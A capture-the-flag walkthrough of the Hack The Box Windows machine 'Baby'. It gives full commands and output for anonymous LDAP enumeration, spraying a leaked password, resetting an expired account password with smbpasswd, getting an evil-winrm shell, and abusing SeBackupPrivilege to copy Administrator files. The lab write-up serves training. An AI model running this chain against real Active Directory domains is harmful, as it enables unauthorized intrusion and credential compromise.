---
title: "Baby Walkthrough - HTB Easy | LDAP Anonymous Bind & SeBackupPrivilege Abuse"
description: "Complete walkthrough of Baby from Hack The Box. An easy Windows Active Directory machine featuring LDAP anonymous bind enumeration revealing initial password in Teresa Bell's description field. Extended LDAP queries discover hidden user Caroline Robinson with STATUS_PASSWORD_MUST_CHANGE. After password reset via smbpasswd, WinRM access grants shell as member of Backup Operators group. SeBackupPrivilege exploitation using SeBackupPrivilegeCmdLets copies the root flag from Administrator's desktop."
author: dua2z3rr
date: 2026-03-03 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["enterprise-network", "vulnerability-assessment", "active-directory", "protocols", "common-services", "security-tools", "authentication", "default-credentials", "powershell", "winrm", "windows", "reconnaissance", "pass-the-hash", "password-spraying", "privilege-abuse", "password-reset"]
image: /assets/img/baby/baby-resized.png
---

## Overview

`Baby` is an easy difficulty Windows machine that features `LDAP` enumeration, password spraying and exposed credentials. For privilege escalation, the `SeBackupPrivilege` is exploited to extract registry hives and the `NTDS.dit` file. A `Pass-the-Hash` attack can be performed using the uncovered domain hashes ultimately achieving `Administrator` access.

---

## External Enumeration

### Nmap

```shell
[Mar 03, 2026 - 18:46:45 (CET)] exegol-main /workspace # ports=$(nmap -p- --min-rate=1000 -T4 10.129.234.71 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV 10.129.234.71
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-03 18:52 CET
<SNIP>
Nmap scan report for 10.129.234.71
Host is up, received echo-reply ttl 127 (0.21s latency).
Scanned at 2026-03-03 18:52:27 CET for 110s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-03 17:52:09Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-03T17:53:01+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
<SNIP>
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

**Key findings:**
- Domain Controller for **baby.vl**
- Port 53: **DNS**
- Port 88: **Kerberos**
- Port 389/636: **LDAP/LDAPS**
- Port 445: **SMB**
- Port 3389: **RDP**
- Port 5985: **WinRM**
- Windows Server 2022 Build 20348

---

## Initial Access

### SMB Enumeration

The Guest account is disabled - no unauthenticated SMB access.

### LDAP Anonymous Bind

We can perform LDAP anonymous binds:

```shell
[Mar 03, 2026 - 19:10:54 (CET)] exegol-main /workspace # windapsearch --dc "BabyDC.baby.vl" -m users
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
cn: Leonard Dyer
sAMAccountName: Leonard.Dyer
userPrincipalName: Leonard.Dyer@baby.vl

dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
cn: Connor Wilkinson
sAMAccountName: Connor.Wilkinson
userPrincipalName: Connor.Wilkinson@baby.vl

dn: CN=Guest,CN=Users,DC=baby,DC=vl
cn: Guest
sAMAccountName: Guest

dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
cn: Hugh George
sAMAccountName: Hugh.George
userPrincipalName: Hugh.George@baby.vl

dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
cn: Ashley Webb
sAMAccountName: Ashley.Webb
userPrincipalName: Ashley.Webb@baby.vl

dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
cn: Jacqueline Barnett
sAMAccountName: Jacqueline.Barnett
userPrincipalName: Jacqueline.Barnett@baby.vl

dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
cn: Joseph Hughes
sAMAccountName: Joseph.Hughes
userPrincipalName: Joseph.Hughes@baby.vl

dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
cn: Kerry Wilson
sAMAccountName: Kerry.Wilson
userPrincipalName: Kerry.Wilson@baby.vl

dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
cn: Teresa Bell
sAMAccountName: Teresa.Bell
userPrincipalName: Teresa.Bell@baby.vl
```

To enumerate more easily, we can use nxc:

```shell
[Mar 03, 2026 - 19:41:27 (CET)] exegol-main baby # nxc ldap -u "" -p "" --dc "BabyDC.baby.vl" -d "BABY" --users
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:BABY) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.71   389    BABYDC           [+] BABY\:
LDAP        10.129.234.71   389    BABYDC           [*] Enumerated 9 domain users: BABY
LDAP        10.129.234.71   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.234.71   389    BABYDC           Guest                         <never>             18       Built-in account for guest access to the computer/domain
LDAP        10.129.234.71   389    BABYDC           Jacqueline.Barnett            2021-11-21 16:11:03 20
LDAP        10.129.234.71   389    BABYDC           Ashley.Webb                   2021-11-21 16:11:03 20
LDAP        10.129.234.71   389    BABYDC           Hugh.George                   2021-11-21 16:11:03 20
LDAP        10.129.234.71   389    BABYDC           Leonard.Dyer                  2021-11-21 16:11:03 20
LDAP        10.129.234.71   389    BABYDC           Connor.Wilkinson              2021-11-21 16:11:08 20
LDAP        10.129.234.71   389    BABYDC           Joseph.Hughes                 2021-11-21 16:11:08 20
LDAP        10.129.234.71   389    BABYDC           Kerry.Wilson                  2021-11-21 16:11:08 20
LDAP        10.129.234.71   389    BABYDC           Teresa.Bell                   2021-11-21 16:14:37 20       Set initial password to BabyStart123!
```

**Initial password discovered:** `BabyStart123!` in Teresa.Bell's description field.

I try to use it with SMB, but it fails. All other protocols fail as well.

### Extended LDAP Enumeration

Let's try enumerating all objects in AD:

```shell
[Mar 03, 2026 - 21:08:31 (CET)] exegol-main baby # nxc ldap 10.129.234.71 -u '' -p '' -d "BABY" --query "(ObjectClass=*)" "" | grep +
LDAP                     10.129.234.71   389    BABYDC           [+] BABY\:
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
<SNIP>
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.129.234.71   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

**New users discovered:** Caroline Robinson and Ian Walker - these didn't appear in the initial user enumeration.

### Password Spray Attack

If we add them to the users to brute-force with the discovered password, we get an interesting result:

```shell
[Mar 03, 2026 - 21:16:19 (CET)] exegol-main baby # nxc smb 10.129.234.71 -u users.txt -p 'BabyStart123!' -d "BABY"
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [-] BABY\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Guest:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE
SMB         10.129.234.71   445    BABYDC           [-] BABY\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

**STATUS_PASSWORD_MUST_CHANGE obtained** - the password is correct but must be changed. We can use the smbpasswd tool:

```shell
[Mar 03, 2026 - 21:22:24 (CET)] exegol-main baby # smbpasswd -r 10.129.234.71 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson on 10.129.234.71.
```

As the new password, I used `Password123!` to follow the same criteria as the old password and avoid password policy errors.

**Credentials obtained:** `Caroline.Robinson:Password123!`

### SMB Enumeration with Credentials

```shell
[Mar 03, 2026 - 21:24:35 (CET)] exegol-main baby # nxc smb 10.129.234.71 -u Caroline.Robinson -p 'Password123!' -d "BABY" --shares
SMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.71   445    BABYDC           [+] BABY\Caroline.Robinson:Password123!
SMB         10.129.234.71   445    BABYDC           [*] Enumerated shares
SMB         10.129.234.71   445    BABYDC           Share           Permissions     Remark
SMB         10.129.234.71   445    BABYDC           -----           -----------     ------
SMB         10.129.234.71   445    BABYDC           ADMIN$          READ            Remote Admin
SMB         10.129.234.71   445    BABYDC           C$              READ,WRITE      Default share
SMB         10.129.234.71   445    BABYDC           IPC$            READ            Remote IPC
SMB         10.129.234.71   445    BABYDC           NETLOGON        READ            Logon server share
SMB         10.129.234.71   445    BABYDC           SYSVOL          READ            Logon server share
```

**We have READ and WRITE permissions on the C$ share!**

### WinRM Access

Let's get the user flag with an evil-winrm shell:

```shell
[Mar 03, 2026 - 21:29:09 (CET)] exegol-main baby # evil-winrm -u "Caroline.Robinson" -p 'Password123!' -i "10.129.234.71"

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..
*Evil-WinRM* PS C:\Users\Caroline.Robinson> cd "C:/Users/Caroline.Robinson/Desktop/"
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir


Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          3/3/2026   4:35 PM             34 user.txt
```

**User flag obtained.**

---

## Privilege Escalation

### Internal Enumeration

Let's do the classic whoami /all:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Key findings:**
- Member of **BUILTIN\Backup Operators** group
- **SeBackupPrivilege** enabled
- **SeRestorePrivilege** enabled

### SeBackupPrivilege Exploitation

We can create a copy of the root.txt flag using SeBackupPrivilege:

```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> upload ../../../../opt/resources/windows/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /workspace/box/baby/../../../../opt/resources/windows/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll to C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilegeUtils.dll

Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> upload ../../../../opt/resources/windows/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /workspace/box/baby/../../../../opt/resources/windows/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll to C:\Users\Caroline.Robinson\Desktop\SeBackupPrivilegeCmdLets.dll

Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop>
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\ROOT.txt' .\root.txt
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir


Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/3/2026   8:57 PM         810416 accesschk64.exe
-a----          3/3/2026   8:59 PM         322440 PsService64.exe
-a----          3/3/2026   8:40 PM             14 qc
-a----          3/3/2026   9:23 PM             34 root.txt
-a----          3/3/2026   9:21 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----          3/3/2026   9:20 PM          16384 SeBackupPrivilegeUtils.dll
-ar---          3/3/2026   4:35 PM             34 user.txt
```

**Root flag obtained.** Box completed.

---

## Reflections

### Main Mistake

I was confused at the beginning because I wasn't familiar with how to perform proper LDAP queries, and had to research how to proceed. I wasted significant time trying other approaches to exploit the SeBackupPrivilege using accesschk64.exe and PsService64.exe, encountering numerous errors with these tools. I should have immediately researched the standard SeBackupPrivilege exploitation techniques using the SeBackupPrivilegeCmdLets before attempting alternative methods.

### Alternative Approaches

HTB used a different approach for the privilege escalation: the `SeBackupPrivilege` is exploited to extract registry hives and the `NTDS.dit` file. A `Pass-the-Hash` attack can be performed using the uncovered domain hashes ultimately achieving `Administrator` access.

### Open Question

Why doesn't Caroline.Robinson appear in standard LDAP user queries, but only in full object enumeration with `(ObjectClass=*)`? This behavior is unusual - typically all user objects should be visible through standard user enumeration filters. It could be due to specific LDAP ACLs restricting visibility, or custom objectClass attributes. If anyone knows the exact reason for this LDAP enumeration behavior, please comment below!

---

**Completed this box? Do you know why Caroline.Robinson was hidden from standard LDAP queries?** Leave a comment down below!
